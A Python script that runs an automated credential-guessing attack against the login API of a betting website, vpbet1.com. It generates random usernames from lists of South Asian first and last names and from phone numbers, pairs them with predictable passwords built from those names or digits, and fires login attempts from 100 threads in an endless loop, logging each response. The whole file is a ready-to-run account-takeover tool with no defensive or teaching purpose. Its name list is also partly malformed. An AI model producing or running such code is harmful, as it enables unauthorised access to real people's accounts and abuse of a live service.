import requests,json
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import random
from mahdix import *
clear()
fasts_names = [
    "Aarav", "Abir", "Adnan", "Afnan", "Ahan", "Ahmed", "Aiden", "Akash", "Alam", "Ali",
    "Aman", "Amin", "Anik", "Anis", "Arif", "Arman", "Asher", "Ashik", "Asif", "Ayman",
    "Aziz", "Bashar", "Bilal", "Bodhi", "Daud", "Ehsan", "Emran", "Fahim", "Farhan", "Firoz",
    "Faisal", "Fazal", "Hadi", "Hamza", "Hasan", "Imran", "Irfan", "Ismail", "Jamal", "Jihan",
    "Kazi", "Khalid", "Kamran", "Karim", "Kashif", "Mahir", "Mahmud", "Mamun", "Mansur",
    "Mashrur", "Mehedi", "Minhaj", "Miraz", "Mizan", "Mobarak", "Moin", "Monir", "Morshed", "Mot"
 "Aarav", "Abir", "Adnan", "Afnan", "Ahan", "Ahmed", "Aiden", "Akash", "Alam", "Ali",
    "Aman", "Amin", "Anik", "Anis", "Arif", "Arman", "Asher", "Ashik", "Asif", "Ayman",
    "Aziz", "Bashar", "Bilal", "Bodhi", "Daud", "Ehsan", "Emran", "Fahim", "Farhan", "Firoz",
    "Faisal", "Fazal", "Hadi", "Hamza", "Hasan", "Imran", "Irfan", "Ismail", "Jamal", "Jihan",
    "Kazi", "Khalid", "Kamran", "Karim", "Kashif", "Mahir", "Mahmud", "Mamun", "Mansur",
    "Mashrur", "Mehedi", "Minhaj", "Miraz", "Mizan", "Mobarak", "Moin", "Monir", "Morshed", "Mot",
    "Nabil", "Nafis", "Nashit", "Nashr", "Nawaf", "Nawaz", "Nazim", "Niaz", "Nihad", "Nihit",
    "Nirav", "Nirban", "Nirjon", "Nirupam", "Nishan", "Nisit", "Nivaan", "Nizam", "Noman", "Noor",
    "Nuha", "Omar", "Omer", "Oni", "Opurbo", "Ornob", "Ovin", "Ovy", "Owais", "Owji",
    "Pankaj", "Parag", "Paras", "Paritosh", "Parth", "Pranav", "Prasad", "Prashant", "Pritam", "Progya",
    "Qamar", "Qasim", "Qazi", "Quamrul", "Rabbi", "Rabiul", "Rafat", "Rafi", "Rafiq", "Rahat",
    "Rahul", "Raihan", "Raisul", "Rakib", "Rakshak", "Rakin", "Rakshit", "Rana", "Ranjan", "Rashad",
    "Rashid", "Ravish", "Rehan", "Reza", "Rezwan", "Riad", "Riaz", "Rifat", "Rifqi", "Rimon",
    "Ripon", "Rishan", "Rishav", "Rishi", "Riyad", "Rizwan", "Rohan", "Rokib", "Roky", "Romel",
    "Rony", "Ruhan", "Ruhul", "Ruksar", "Sabbir", "Sabeer", "Sabir", "Sabit", "Sabuj", "Sachin",
    "Sadiq", "Sadman", "Safal", "Safiq", "Sagar", "Sagor", "Sahil", "Sajal", "Sajid", "Sakib",
    "Sakil", "Sakir", "Salim", "Salman", "Sami", "Samir", "Samit", "Samrat", "Samuel", "Sanaul",
    "Sanjay", "Santo", "Sarfaraz", "Sarim", "Sarwar", "Saswata", "Sayed", "Shabbir", "Shafi", "Shah",
    "Shahid", "Shahin", "Shahriar", "Shahrukh", "Shahzad", "Shakil", "Shamim", "Shams", "Shamsul",
    "Shan", "Shantanu", "Sharif", "Shariq", "Shariyar", "Shashi", "Shawkat", "Shayon", "Shazid",
    "Shihab", "Shohel", "Shohid", "Shuvo", "Siam", "Siddiq", "Sifat", "Sijan", "Sikandar", "Simanto",
    "Sinan", "Siraj", "Siraz", "Siyam", "Sk", "Sohail", "Soham", "Sohan", "Sohel", "Solaiman",
    "Sourav", "Subhan", "Sudip", "Sufian", "Sujan", "Suman", "Sumit", "Sunil", "Sunny", "Supriyo",
    "Suraj", "Surya", "Suvro", "Swadhin", "Swapan", "Swarnadeep", "Syed", "Tajwar", "Talha", "Tanay",
    "Tanbir", "Tanim", "Tanish", "Tanishq", "Tanmay", "Tanvir", "Tariq", "Tasnim", "Tawhid", "Tayyab",
    "Tuhin", "Tuhin", "Tushar", "Udbhav", "Uddalok", "Uddin", "Uddipan", "Uddipta", "Uday", "Udbhav",
    "Udeep", "Udit", "Ujjal", "Ujwal", "Umar", "Upamanyu", "Upendra", "Upoma", "Urbashi", "Urmi",
    "Urmila", "Urooj", "Urvi", "Usama", "Usha", "Ushashi", "Ushasi", "Uzma", "Uzra", "Vaibhav",
    "Vandana", "Vanita", "Varun", "Vasudev", "Vasundhara", "Ved", "Vedant", "Veer", "Vibha", "Vibhuti",
    "Vidhi", "Vidur", "Vidyut", "Vidya", "Vijay", "Vijaya", "Vikas", "Vikram", "Vikrant", "Vimal",
    "Vinay", "Vinaya", "Vineet", "Vinod", "Vinayak", "Vinita", "Vipin", "Vipul", "Viral", "Virat",
    "Vishal", "Vishnu", "Vishwa", "Vivek", "Vrinda", "Vrindavan", "Vritti", "Vyas", "Vyom", "Wahid",
    "Waqar", "Wasim", "Wasiq", "Yadunandan", "Yaduvir", "Yash", "Yashas", "Yashasvi", "Yasin", "Yashraj",
    "Yusuf", "Zaheer", "Zaib", "Zaid", "Zain", "Zakir", "Zaki", "Zakir", "Zaman", "Zarif",
    "Zeeshan", "Zenith", "Zeeshan", "Zeeshan", "Zia", "Zishan", "Zohaib", "Zubair", "Zunaid", "Zyad"

]
_last_names = [
    "Ahmed", "Ali", "Bhuiyan", "Chowdhury", "Das", "Hossain", "Islam", "Khan", "Miah", "Rahman",
    "Sarker", "Uddin", "Mondal", "Choudhury", "Karmakar", "Biswas", "Siddiqui", "Karim", "Hasan", "Barman",
    "Chakraborty", "Roy", "Majumdar", "Banerjee", "Sen", "Ghosh", "Pal", "Bhowmick", "Gupta", "Dutta",
    "Biswas", "Ganguly", "Mitra", "Mondal", "Saha", "Majhi", "Majumder", "Mallick", "Naskar", "Sharma",
    "Biswas", "Chatterjee", "Mukherjee", "Paul", "Bera", "Giri", "Patra", "Shaw", "Dhar", "Nandi",
    "Bhattacharya", "Dutta", "Dey", "Nath", "Bairagi", "Gangopadhyay", "Banik", "Gorai", "Rai", "Ghatak",
    "Bhunia", "Sikder", "Bepari", "Mollick", "Sutradhar", "Dewan", "Barua", "Rana", "Biswas", "Acharya",
    "Rahman", "Ali", "Khan", "Ahmed", "Hasan", "Hossain", "Islam", "Chowdhury", "Haque", 
    "Ahmed", "Hussain", "Akhtar", "Khanam", "Begum", "Choudhury", "Akhter", "Uddin", "Chowdhury", 
    "Miah", "Sarker", "Mia", "Ahmed", "Siddique", "Hossain", "Parvin", "Akter", "Khan", 
    "Amin", "Alam", "Das", "Sultana", "Kabir", "Chowdhury", "Hoque", "Bashar", "Paul", 
    "Roy", "Dewan", "Shikder", "Saha", "Khatun", "Ahmed", "Dewan", "Sardar", "Biswas", 
    "Rahman", "Bepary", "Shil", "Laskar", "Akanda", "Sana", "Shaikh", "Sarder", "Sarkar", 
    "Sarker", "Rana", "Barman", "Baidya", "Saha", "Dey", "Nath", "Rani", "Gazi", 
    "Sha", "Dhar", "Nag", "Dutta", "Ray", "Mandal", "Goswami", "Banik", "Das", 
    "Karmakar", "Nath", "Gupta", "Bhuiyan", "Dasgupta", "Talukder", "Karim", "Dewan", "Mondal", 
    "Saha", "Sarker", "Sheikh", "Chakraborty", "Mandal", "Paul", "Biswas", "Barman", "Baidya", 
    "Roy", "Akanda", "Bepary", "Rani", "Sha", "Ray", "Nag", "Dey", "Sana", "Gazi"
]
clear()
count=0


headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi;q=0.8,bn;q=0.7',
    'areacode': 'BD',
    'channel': '1000',
    'clientversion': '0.2.1055',
    'content-type': 'application/json',
    'device': 'Windows 10 amd64',
    'devicecode': '1ae142f38663143590f08c942de43284',
    'devicetype': 'web',
    'dnt': '1',
    'language': 'en',
    'origin': 'https://vpbet1.com',
    'priority': 'u=1, i',
    'referer': 'https://vpbet1.com/casino/group/fa-chai?fbclid=IwZXh0bgNhZW0CMTAAAR162ovMUtUx_i0lScG_Gt9NYKYFWRRXjmXvSpjkjgZC-foSUo7mhBTQ3ns_aem_AZYrWypQGZEh3FdDas-V4HoSHfomCFPOrqkMnc8Ey9J84AhsBbA5k0hOpbRW6SU-Dr08pY2Sg6ZdJAl8jo1FJ0SU&modal=auth&tab=login',
    'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'source': 'https://vpbet1.com/casino/group/fa-chai?fbclid=IwZXh0bgNhZW0CMTAAAR162ovMUtUx_i0lScG_Gt9NYKYFWRRXjmXvSpjkjgZC-foSUo7mhBTQ3ns_aem_AZYrWypQGZEh3FdDas-V4HoSHfomCFPOrqkMnc8Ey9J84AhsBbA5k0hOpbRW6SU-Dr08pY2Sg6ZdJAl8jo1FJ0SU&modal=auth&tab=login',
    'sourcetype': 'Windows',
    'tid': '10',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
}
def login(user_name,pawx):
    for password in pawx:
        json_data = {
            'password': password,
            'account': user_name,
        }

        response = requests.post('https://vpbet1.com/api/web/login',  headers=headers, json=json_data).json()
        print(response['message'],f' {user_name}|{password}')
        if "Account does not exist" in response['message']:
            break
        
def user_name():
    with ThreadPool(max_workers=100) as ahare:
        while True:
            name = f'{random.choice(fasts_names)} {random.choice(_last_names)}'
            fast = name.split(' ')[0]
            mahdi_last = name.split(' ')[1]
            user_name=f"{random.choice(name.split(' ')).lower()}{random.randint(111,9999)}"
            wx = [fast+'1@@',fast+'1234',fast+'123@',fast+'2233@@',fast+'123#@',fast+'123@',fast+'121##@@',mahdi_last+'1234',mahdi_last+'123@',mahdi_last+'2233@@',mahdi_last+'123#@',mahdi_last+'123@']
            ahare.submit(login,user_name,wx)
        

def number():
    with ThreadPool(max_workers=100) as ahare:
        while True:
            bd_number=randombd()
            passwod_list=[bd_number,bd_number[:6],bd_number[:8],bd_number[4:],bd_number[3:],bd_number[2:],bd_number[1:]]
            ahare.submit(login,bd_number,passwod_list)
user_name()